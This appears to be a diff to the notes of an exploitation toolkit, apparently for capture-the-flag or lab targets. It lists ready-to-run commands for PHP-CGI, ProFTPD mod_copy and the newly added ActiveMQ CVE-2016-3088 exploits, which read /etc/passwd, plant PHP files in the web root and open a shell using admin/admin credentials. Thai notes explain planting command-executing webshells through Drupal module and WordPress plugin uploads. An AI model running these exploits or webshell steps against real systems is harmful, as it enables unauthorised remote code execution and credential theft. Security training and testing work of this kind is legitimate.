@@ -85,6 +85,10 @@ python tools/php_cgi_cve_2012_1823.py --url http://target/index.php --cmd id
 python tools/proftpd_modcopy_cve_2015_3306.py --host target --read /etc/passwd --web http://target
 python tools/proftpd_modcopy_cve_2015_3306.py --host target --cpfr /tmp/x.php --cpto /var/www/html/x.php
 python tools/proftpd_modcopy_cve_2015_3306.py --host target --find-flag --web http://target
+
+# ActiveMQ fileserver CVE-2016-3088 (PUT + MOVE -> JSP RCE)
+python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --cmd id
+python tools/activemq_cve_2016_3088.py --url http://target:8161 --user admin --pass admin --shell
 ```
 - Drupal: สร้างโมดูล PHP (`info.yml` + `routing.yml` + Controller `shell_exec`) แล้วอัปโหลดผ่าน `/admin/modules/install`, enable ที่ `/admin/modules`; route `GET /<module>?c=<cmd>`
 - WordPress: สร้าง plugin zip แล้วอัปโหลดผ่าน `update.php?action=upload-plugin`; เรียก `GET /wp-content/plugins/<slug>/<slug>.php?c=<cmd>` (ไม่ต้อง activate)
